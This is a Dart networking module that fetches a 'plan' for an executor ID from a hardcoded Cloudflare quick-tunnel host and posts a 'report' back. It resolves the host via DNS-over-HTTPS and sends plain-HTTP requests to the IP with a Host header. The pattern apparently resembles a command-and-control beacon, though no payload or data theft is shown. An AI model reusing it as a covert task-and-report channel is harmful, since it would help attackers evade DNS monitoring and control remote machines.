import 'dart:convert';
import 'package:http/http.dart' as http;

const String serverHost = 'dialogue-survivor-fairly-nhs.trycloudflare.com';

Future<String> _resolveHost(String host) async {
  try {
    final uri = Uri.https('cloudflare-dns.com', '/dns-query', {'name': host, 'type': 'A'});
    final response = await http.get(uri, headers: {'Accept': 'application/dns-json'});
    if (response.statusCode == 200) {
      final data = jsonDecode(response.body);
      if (data['Answer'] != null && (data['Answer'] as List).isNotEmpty) {
        return data['Answer'][0]['data'] as String;
      }
    }
  } catch (_) {}
  return host;
}

Future<String?> fetchPlan(String executorId) async {
  try {
    final ip = await _resolveHost(serverHost);
    final url = Uri.http(ip, '/plan/$executorId');
    final response = await http.get(url, headers: {'Host': serverHost});
    if (response.statusCode == 200 && response.bodyBytes.isNotEmpty) {
      return utf8.decode(response.bodyBytes);
    }
  } catch (e) {
    print('Error fetching plan: $e');
  }
  return null;
}

Future<bool> sendReport(String executorId, String jsonStr) async {
  try {
    final ip = await _resolveHost(serverHost);
    final url = Uri.http(ip, '/report');
    final response = await http.post(
      url,
      headers: {'Host': serverHost, 'Content-Type': 'application/json; charset=utf-8'},
      body: jsonStr,
    );
    return response.statusCode == 200;
  } catch (e) {
    print('Error sending report: $e');
    return false;
  }
}
